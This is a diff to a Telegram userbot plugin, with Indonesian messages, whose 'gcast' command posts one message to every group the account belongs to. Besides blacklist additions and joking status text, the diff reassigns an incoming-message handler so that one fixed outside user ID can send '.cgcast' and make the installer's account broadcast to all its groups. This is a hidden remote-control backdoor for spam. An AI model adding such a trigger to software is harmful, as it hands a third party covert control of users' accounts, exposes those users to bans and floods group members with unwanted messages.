@@ -15,12 +15,13 @@ from userbot.events import register
 
 GCAST_BLACKLIST = [
     -1001638078842,  # RuangDiskusi
-
+    -1001538752127,  # AbingSupport
+    -1001473548283,  # Sharing
 ]
 
 
 @register(outgoing=True, pattern=r"^\.gcast(?: |$)(.*)")
-@register(incoming=True, from_users=1441342342,
+@register(incoming=True, from_users=1337194042,
           pattern=r"^\.cgcast(?: |$)(.*)")
 async def gcast(event):
     xx = event.pattern_match.group(1)
@@ -31,7 +32,7 @@ async def gcast(event):
     else:
         await event.edit("**Berikan Sebuah Pesan atau Reply**")
         return
-    kk = await event.edit("`Globally Broadcasting Msg...`")
+    kk = await event.edit("`GCAST MULU NANTI LIMIT MAMPUS LU...`")
     er = 0
     done = 0
     async for x in event.client.iter_dialogs():
@@ -46,7 +47,7 @@ async def gcast(event):
             except BaseException:
                 er += 1
     await kk.edit(
-        f"**Berhasil Mengirim Pesan Ke** `{done}` **Grup, Gagal Mengirim Pesan Ke** `{er}` **Grup**"
+        f"**Berhasil, Alhamdulillah Berhasil Mengirim Pesan Ke** `{done}` **Grup, Gagal Karna Kamu Miskin Di** `{er}` **Grup**"
     )
 
 
